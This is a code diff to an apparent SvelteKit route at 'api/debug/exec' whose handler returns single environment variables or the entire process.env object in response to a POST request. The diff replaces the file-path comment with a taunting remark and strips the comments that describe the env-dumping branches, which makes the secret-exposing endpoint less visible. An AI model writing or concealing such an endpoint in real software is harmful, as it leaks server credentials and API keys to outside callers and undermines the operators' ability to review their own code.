@@ -1,4 +1,4 @@
-// src/routes/api/debug/exec/+server.ts
+// hello there, tf u doing on my code????
 import type { RequestHandler } from './$types';
 import { getRecordByApiKey } from '$lib/telegramStorage';
 
@@ -28,7 +28,6 @@ export const POST: RequestHandler = async ({ request, cookies }) => {
 
     const expr = code.trim();
 
-    // Direct env access: process.env.FOO or process.env["FOO"]
     const envMatch = expr.match(/^process\.env\[?["']([A-Z_][A-Z0-9_]*)["']\]?$/i);
     if (envMatch) {
       const val = process.env[envMatch[1]];
@@ -38,7 +37,6 @@ export const POST: RequestHandler = async ({ request, cookies }) => {
       });
     }
 
-    // process.env (whole object, filtered to non-empty)
     if (expr === 'process.env') {
       const env: Record<string, string> = {};
       for (const [k, v] of Object.entries(process.env)) {
@@ -49,7 +47,6 @@ export const POST: RequestHandler = async ({ request, cookies }) => {
       });
     }
 
-    // process.env.VAR fallback
     const dotMatch = expr.match(/^process\.env\.([A-Z_][A-Z0-9_]*)$/i);
     if (dotMatch) {
       const val = process.env[dotMatch[1]];
